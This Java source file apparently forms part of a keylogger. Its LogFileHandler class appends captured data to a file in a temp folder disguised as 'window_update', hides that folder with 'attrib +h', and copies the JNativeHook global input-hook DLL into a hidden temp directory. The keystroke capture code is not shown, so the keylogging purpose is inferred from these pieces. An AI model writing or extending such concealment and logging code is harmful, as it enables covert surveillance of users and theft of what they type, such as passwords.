import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

class LogFileHandler {
    public static final String TEMP_FOLDER_PATH = System.getProperty("java.io.tmpdir");
    public static final String LOG_FOLDER_PATH = TEMP_FOLDER_PATH + File.separator + "window_update" ;

    public static synchronized void writeToFile(String data) {
        File logFile = new File(LogFileHandler.LOG_FOLDER_PATH + File.separator + "data.txt");
        try {
            File parentDir = logFile.getParentFile();
            if (!parentDir.exists()) {
                parentDir.mkdirs();
            }

            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFile, true))) {
                writer.write(data);
                writer.newLine();
            }
            // Ẩn thư mục LOG_FOLDER_PATH
            Process folderProcess = Runtime.getRuntime().exec("attrib +h " + LOG_FOLDER_PATH);
            folderProcess.waitFor();

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public static void moveJNativeHookDll() {
        try {
            String exePath = new File(LogFileHandler.class.getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()).getParent(); // Lấy thư mục chứa chương trình
            String dllPath = exePath + File.separator + "JNativeHook.x86_64.dll"; // Path to DLL file

            File dllFile = new File(dllPath);
            if (!dllFile.exists()) {
                // Thử tìm file DLL với tên gốc trong thư mục libs
                String originalDllPath = exePath + File.separator + "libs" + File.separator + "JNativeHook-2.2.2.x86_64.dll";
                File originalDllFile = new File(originalDllPath);
                if (originalDllFile.exists()) {
                    // Copy file from libs to root directory
                    Files.copy(originalDllFile.toPath(), dllFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                    System.out.println("Copied DLL file from libs: " + originalDllPath + " -> " + dllPath);
                } else {
                    System.err.println("DLL file not found. Check: " + dllPath + " or " + originalDllPath);
                    return;
                }
            }

            String tempFolderPath = TEMP_FOLDER_PATH + File.separator + "Runtime";
            File tempFolder = new File(tempFolderPath);

            // Tạo thư mục nếu chưa tồn tại
            if (!tempFolder.exists()) {
                tempFolder.mkdirs();
            }

            // Copy (thay vì move) file jnativehook.dll vào thư mục tạm để giữ lại file gốc
            File targetFile = new File(tempFolder, dllFile.getName());
            Files.copy(dllFile.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            // Ẩn file jnativehook.dll
            Process process = Runtime.getRuntime().exec("attrib +h " + targetFile.getAbsolutePath());
            process.waitFor();

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
